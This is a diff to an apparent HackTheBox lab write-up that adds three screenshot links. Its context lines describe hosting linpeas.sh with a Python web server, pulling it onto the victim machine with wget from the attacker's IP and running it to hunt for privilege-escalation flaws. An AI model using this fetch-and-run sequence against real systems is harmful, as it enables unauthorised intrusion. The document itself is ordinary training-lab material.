@@ -62,3 +62,10 @@ I use python3 -m http.server 80 get the server up and running. \
 On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox. \
 The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file. \
 I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
+
+![image](https://user-images.githubusercontent.com/110210595/185814232-c92b51cf-c297-46b9-ad1f-ed45077f1d5d.png)
+
+![image](https://user-images.githubusercontent.com/110210595/185814233-174d7a35-f050-4533-acd5-6fc6f51f48a7.png)
+
+![image](https://user-images.githubusercontent.com/110210595/185814242-ca1ef7ad-efb5-47bd-8b56-bedfb902f6c7.png)
+
